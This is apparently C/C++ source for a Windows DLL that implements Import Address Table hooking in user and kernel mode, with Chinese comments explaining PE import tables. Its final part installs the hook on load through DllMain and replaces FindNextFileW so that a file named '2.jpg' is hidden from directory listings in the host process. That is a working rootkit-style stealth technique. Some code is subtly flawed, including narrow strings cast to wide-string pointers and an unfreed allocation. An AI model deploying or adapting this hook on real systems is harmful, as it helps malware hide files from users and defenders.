// windows IATHook for kernelmode and usermode 
// by TinySec( root@tinysec.net )
// you can free use this code , but if you had modify , send a copy to to my email please.



/*
LONG IATHook
(
__in void* pImageBase ,
__in_opt char* pszImportDllName ,
__in char* pszRoutineName ,
__in void* pFakeRoutine ,
__out HANDLE* Param_phHook
);

LONG UnIATHook( __in HANDLE hHook );

void* GetIATHookOrign( __in HANDLE hHook );
*/


//////////////////////////////////////////////////////////////////////////
#define WIN32_LEAN_AND_MEAN 

#ifdef _RING0
#include <ntddk.h>
#include <ntimage.h>
#else
#include <windows.h>
#include<stdio.h>
#include <stdlib.h>
#endif //#ifdef _RING0
WIN32_FIND_DATA p;

//////////////////////////////////////////////////////////////////////////

typedef struct _IATHOOK_BLOCK
{
	void*	pOrigin;

	void*	pImageBase;
	char*	pszImportDllName;
	char*	pszRoutineName;

	void*	pFake;

}IATHOOK_BLOCK;


//////////////////////////////////////////////////////////////////////////
extern "C" __declspec(dllexport)
void* _IATHook_Alloc(__in ULONG nNeedSize)
{
	void* pMemory = NULL;

	do
	{
		if (0 == nNeedSize)
		{
			break;
		}

#ifdef _RING0
		pMemory = ExAllocatePoolWithTag(NonPagedPool, nNeedSize, 'iath');

#else
		pMemory = malloc(nNeedSize);
#endif // #ifdef _RING0

		if (NULL == pMemory)
		{
			break;
		}

		RtlZeroMemory(pMemory, nNeedSize);

	} while (FALSE);

	return pMemory;
}

extern "C" __declspec(dllexport)
ULONG _IATHook_Free(__in void* pMemory)
{

	do
	{
		if (NULL == pMemory)
		{
			break;
		}

#ifdef _RING0
		ExFreePool(pMemory);

#else
		free(pMemory);
#endif // #ifdef _RING0

		pMemory = NULL;

	} while (FALSE);

	return 0;
}

//////////////////////////////////////////////////////////////////////////
#ifdef _RING0


#ifndef LOWORD
#define LOWORD(l)           ((USHORT)((ULONG_PTR)(l) & 0xffff))
#endif // #ifndef LOWORD

extern "C" __declspec(dllexport)
void*  _IATHook_InterlockedExchangePointer(__in void* pAddress, __in void* pValue)
{
	void*	pWriteableAddr = NULL;
	PMDL	pNewMDL = NULL;
	void*	pOld = NULL;

	do
	{
		if ((NULL == pAddress))
		{
			break;
		}

		if (!NT_SUCCESS(MmIsAddressValid(pAddress)))
		{
			break;
		}

		pNewMDL = IoAllocateMdl(pAddress, sizeof(void*), FALSE, FALSE, NULL);
		if (pNewMDL == NULL)
		{
			break;
		}

		__try
		{
			MmProbeAndLockPages(pNewMDL, KernelMode, IoWriteAccess);

			pNewMDL->MdlFlags |= MDL_MAPPING_CAN_FAIL;

			pWriteableAddr = MmMapLockedPagesSpecifyCache(
				pNewMDL,
				KernelMode,
				MmNonCached,
				NULL,
				FALSE,
				HighPagePriority
			);

			//pWriteableAddr = MmMapLockedPages(pNewMDL, KernelMode);
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			break;
		}

		if (pWriteableAddr == NULL)
		{
			MmUnlockPages(pNewMDL);
			IoFreeMdl(pNewMDL);

			break;
		}

		pOld = InterlockedExchangePointer(pWriteableAddr, pValue);

		MmUnmapLockedPages(pWriteableAddr, pNewMDL);
		MmUnlockPages(pNewMDL);
		IoFreeMdl(pNewMDL);

	} while (FALSE);

	return pOld;
}


//////////////////////////////////////////////////////////////////////////
#else
extern "C" __declspec(dllexport)
void*  _IATHook_InterlockedExchangePointer(__in void* pAddress, __in void* pValue)
{
	void*	pWriteableAddr = NULL;
	void*	nOldValue = NULL;
	ULONG	nOldProtect = 0;
	BOOL	bFlag = FALSE;

	do
	{
		if ((NULL == pAddress))
		{
			break;
		}

		bFlag = VirtualProtect(pAddress, sizeof(void*), PAGE_EXECUTE_READWRITE, &nOldProtect);
		if (!bFlag)
		{
			break;
		}
		pWriteableAddr = pAddress;

		nOldValue = InterlockedExchangePointer((PVOID*)pWriteableAddr, pValue);

		VirtualProtect(pAddress, sizeof(void*), nOldProtect, &nOldProtect);

	} while (FALSE);

	return nOldValue;
}

#endif // #ifdef _RING0

extern "C" __declspec(dllexport)
LONG _IATHook_Single
(
	__in IATHOOK_BLOCK*	pHookBlock,
	__in IMAGE_IMPORT_DESCRIPTOR*	pImportDescriptor,
	__in BOOLEAN bHook
)
{
	LONG				nFinalRet = -1;

	IMAGE_THUNK_DATA*	pOriginThunk = NULL;
	IMAGE_THUNK_DATA*	pRealThunk = NULL;

	IMAGE_IMPORT_BY_NAME*	pImportByName = NULL;

	do
	{
		// OriginalFirstThunk(Characteristics):这是一个IMAGE_THUNK_DATA数组的RVA（相对于PE文件起始处）
		// (IMAGE_THUNK_DATA*)((UCHAR*)pHookBlock->pImageBase是基址地址
		//FirstThunk:通常也是一个IMAGE_THUNK_DATA数组的RVA。如果不是一个指针，它就是该功能在DLL中的序号。
		//OriginalFirstThunk与FirstThunk指向两个本质相同的数组IMAGE_THUNK_DATA，但名称不同，
		//分别是输入名称表(Import Name Table, INT)和输入地址表(Import Address Table, IAT)。
		//每一个IMAGE_THUNK_DATA对应着一个被导入的函数。
		//PE 装载器首先搜索 OriginalFirstThunk ，找到之后加载程序迭代搜索数组中的每个指针，找到每个 IMAGE_IMPORT_BY_NAME 结构所指向的输入函数的地址，然后加载器用函数真正入口地址来替代由 FirstThunk 数组中的一个入口，因此我们称为输入地址表（IAT）。

		pOriginThunk = (IMAGE_THUNK_DATA*)((UCHAR*)pHookBlock->pImageBase + pImportDescriptor->OriginalFirstThunk);
		pRealThunk = (IMAGE_THUNK_DATA*)((UCHAR*)pHookBlock->pImageBase + pImportDescriptor->FirstThunk);

		//遍历 pOriginalRhunk中的Function
		for (; 0 != pOriginThunk->u1.Function; pOriginThunk++, pRealThunk++)
		{
			//IAT中的IMAGE_THUNK_DATA中存储的如果是Ordinal 首位为1 如果为真 则..
			if (IMAGE_ORDINAL_FLAG == (pOriginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG))
			{
				//如果二者相等 表明函数找到了
				if ((USHORT)pHookBlock->pszRoutineName == LOWORD(pOriginThunk->u1.Ordinal))
				{
					//bHook->bool  hook or unhook
					if (bHook)
					{
						//修改origin trunk Function：被导入的函数的入口地址
						pHookBlock->pOrigin = (void*)pRealThunk->u1.Function;
						//交换两个函数地址 修改指针地址
						_IATHook_InterlockedExchangePointer((void**)&pRealThunk->u1.Function, pHookBlock->pFake);
					}
					else
					{
						//不是要iat的对象 不修改其原地址
						_IATHook_InterlockedExchangePointer((void**)&pRealThunk->u1.Function, pHookBlock->pOrigin);
					}

					nFinalRet = 0;
					break;
				}
			}
			//IAT中的IMAGE_THUNK_DATA中存储的如果是AddressOfData
			else
			{
				pImportByName = (IMAGE_IMPORT_BY_NAME*)((char*)pHookBlock->pImageBase + pOriginThunk->u1.AddressOfData);

				//如果二者相等
				if (0 == _stricmp(pImportByName->Name, pHookBlock->pszRoutineName))
				{
					if (bHook)
					{
						pHookBlock->pOrigin = (void*)pRealThunk->u1.Function;
						_IATHook_InterlockedExchangePointer((void**)&pRealThunk->u1.Function, pHookBlock->pFake);
					}
					else
					{
						_IATHook_InterlockedExchangePointer((void**)&pRealThunk->u1.Function, pHookBlock->pOrigin);
					}

					nFinalRet = 0;
					break;
				}
			}

		}

	} while (FALSE);

	return nFinalRet;
}

extern "C" __declspec(dllexport)
LONG _IATHook_Internal(__in IATHOOK_BLOCK* pHookBlock, __in BOOLEAN bHook)
{
	//MessageBoxA(NULL, "_IATHook_Internal", "caption", 0);
	LONG				nFinalRet = -1;
	LONG				nRet = -1;
	IMAGE_DOS_HEADER*	pDosHeader = NULL;
	//PE头。结构：PE标识符、文件头与可选头这三部分。
	/*typedef struct _IMAGE_NT_HEADERS {
	DWORD Signature;                              //位置在e_lfanew上
	IMAGE_FILE_HEADER FileHeader;                 //e_lfanew + 0x4         文件头结构体
	IMAGE_OPTIONAL_HEADER32 OptionalHeader;       //e_lfanew + 0x18        可选头结构体
	} IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;
	*/
	IMAGE_NT_HEADERS*	pNTHeaders = NULL;

	//IMAGE_IMPORT_DESCRIPTOR结构体中记录着PE文件要导入哪些库文件
	IMAGE_IMPORT_DESCRIPTOR*	pImportDescriptor = NULL;
	char*						pszImportDllName = NULL;


	do
	{
		if (NULL == pHookBlock)
		{
			break;
		}
		//对于一个PE文件来说，最开始的位置就是一个DOS程序。DOS程序包含一个DOS头和一个DOS程序体。
		//DOS头部是由IMAGE_DOS_HEADER结构体来定义的。e_magic 字段是一个DOS可执行文件的标识符
		OutputDebugString((LPCWSTR)"_IATHook_Internal");
		pDosHeader = (IMAGE_DOS_HEADER*)pHookBlock->pImageBase;
		if (IMAGE_DOS_SIGNATURE != pDosHeader->e_magic)
		{
			OutputDebugString((LPCWSTR)"_IATHook_Internal:IMAGE_DOS_SIGNATURE != pDosHeader->e_magic");
			break;
		}

		pNTHeaders = (IMAGE_NT_HEADERS*)((UCHAR*)pHookBlock->pImageBase + pDosHeader->e_lfanew);
		if (IMAGE_NT_SIGNATURE != pNTHeaders->Signature)
		{
			OutputDebugString((LPCWSTR)"_IATHook_Internal:IMAGE_NT_SIGNATURE != pNTHeaders->Signature");
			break;
		}

		if (0 == pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress)
		{
			OutputDebugString((LPCWSTR)"_IATHook_Internal:break");
			break;
		}

		if (0 == pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size)
		{
			OutputDebugString((LPCWSTR)"_IATHook_Internal:break");
			break;
		}
		//输入表 等于基址地址加上虚拟地址
		pImportDescriptor = (IMAGE_IMPORT_DESCRIPTOR*)((UCHAR*)pHookBlock->pImageBase + pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);


		// Find pszRoutineName in every Import descriptor
		nFinalRet = -1;
		//遍历 一个PE文件对应一个IMAGE_IMPORT_DESCRIPTOR 先找到指定的dll 也就是system32.dll
		for (; (pImportDescriptor->Name != 0); pImportDescriptor++)
		{
			OutputDebugString((LPCWSTR)"_IATHook_Internal:in loop");
			//dll文件名称
			pszImportDllName = (char*)pHookBlock->pImageBase + pImportDescriptor->Name;

			if (NULL != pHookBlock->pszImportDllName)
			{
				//没找到 继续找
				if (0 != _stricmp(pszImportDllName, pHookBlock->pszImportDllName))
				{
					continue;
				}
			}
			OutputDebugString((LPCWSTR)"before single");
			nRet = _IATHook_Single(
				pHookBlock,
				pImportDescriptor,
				bHook
			);

			if (0 == nRet)
			{
				nFinalRet = 0;
				break;
			}
		}

	} while (FALSE);

	return nFinalRet;
}
extern "C" __declspec(dllexport)
LONG IATHook
(
	__in void* pImageBase,
	__in_opt char* pszImportDllName,
	__in char* pszRoutineName,
	__in void* pFakeRoutine,
	__out HANDLE* Param_phHook
)
{

	LONG				nFinalRet = -1;
	IATHOOK_BLOCK*		pHookBlock = NULL;


	do
	{
		if ((NULL == pImageBase) || (NULL == pszRoutineName) || (NULL == pFakeRoutine))
		{
			break;
		}
		//内存分配
		pHookBlock = (IATHOOK_BLOCK*)_IATHook_Alloc(sizeof(IATHOOK_BLOCK));
		if (NULL == pHookBlock)
		{
			break;
		}
		RtlZeroMemory(pHookBlock, sizeof(IATHOOK_BLOCK));
		//结构体初始化 根据输入参数
		pHookBlock->pImageBase = pImageBase;
		pHookBlock->pszImportDllName = pszImportDllName;
		pHookBlock->pszRoutineName = pszRoutineName;
		pHookBlock->pFake = pFakeRoutine;

		__try
		{
			//修改
			nFinalRet = _IATHook_Internal(pHookBlock, TRUE);
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			nFinalRet = -1;
		}

	} while (FALSE);

	if (0 != nFinalRet)
	{
		if (NULL != pHookBlock)
		{
			_IATHook_Free(pHookBlock);
			pHookBlock = NULL;
		}
	}

	if (NULL != Param_phHook)
	{
		*Param_phHook = pHookBlock;
	}

	return nFinalRet;
}
extern "C" __declspec(dllexport)
LONG UnIATHook(__in HANDLE hHook)
{
	IATHOOK_BLOCK*		pHookBlock = (IATHOOK_BLOCK*)hHook;
	LONG				nFinalRet = -1;

	do
	{
		if (NULL == pHookBlock)
		{
			break;
		}

		__try
		{
			nFinalRet = _IATHook_Internal(pHookBlock, FALSE);
		}
		__except (EXCEPTION_EXECUTE_HANDLER)
		{
			nFinalRet = -1;
		}

	} while (FALSE);

	if (NULL != pHookBlock)
	{
		_IATHook_Free(pHookBlock);
		pHookBlock = NULL;
	}

	return nFinalRet;
}
extern "C" __declspec(dllexport)
void* GetIATHookOrign(__in HANDLE hHook)
{
	//强制类型转换 把handle类转为IATHOOK_BLOCK
	IATHOOK_BLOCK*		pHookBlock = (IATHOOK_BLOCK*)hHook;
	void*				pOrigin = NULL;

	do
	{
		if (NULL == pHookBlock)
		{
			break;
		}

		pOrigin = pHookBlock->pOrigin;

	} while (FALSE);

	return pOrigin;
}


//API的函数体
typedef BOOL(WINAPI *LPFN_FindNextFile)
(
	_In_ HANDLE hFindFile,
	_Out_ LPWIN32_FIND_DATAW lpFindFileData);

HANDLE g_hHook_FindNextFile = NULL;
//////////////////////////////////////////////////////////////////////////
//可选输入参数
extern "C" __declspec(dllexport)
BOOL WINAPI Fake_FindNextFile(_In_ HANDLE hFindFile, _Out_ LPWIN32_FIND_DATAW lpFindFileData)
{
	LPFN_FindNextFile fnOrigin = (LPFN_FindNextFile)GetIATHookOrign(g_hHook_FindNextFile);
	//判断返回值
	LARGE_INTEGER filesize;
	char *CStr = "2.jpg";
	size_t len = strlen(CStr) + 1;
	size_t converted = 0;
	wchar_t *WStr;
	WStr = (wchar_t*)malloc(len * sizeof(wchar_t));
	mbstowcs_s(&converted, WStr, len, CStr, _TRUNCATE);

	bool tf = (*fnOrigin)(hFindFile, lpFindFileData);
	if (0 == wcscmp((*lpFindFileData).cFileName, WStr))
	{
		//再调用一次
		tf = (*fnOrigin)(hFindFile, lpFindFileData);
	}
	return tf;
}
extern "C" __declspec(dllexport)
DWORD WINAPI FindNextFileThread(LPVOID lpParam)
{
	do
	{
		IATHook(
			GetModuleHandleW(NULL),
			"api-ms-win-core-file-l1-2-1.dll",
			"FindNextFileW",
			Fake_FindNextFile,
			//输出参数
			&g_hHook_FindNextFile
		);
	} while (FALSE);
	return 0;
}
extern "C" __declspec(dllexport)
BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD ul_reason_for_call,
	LPVOID lpReserved) {
	switch (ul_reason_for_call) {
	case DLL_PROCESS_ATTACH:
	{
		CreateThread(NULL, NULL, FindNextFileThread, NULL, NULL, NULL);
		break;
	}
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}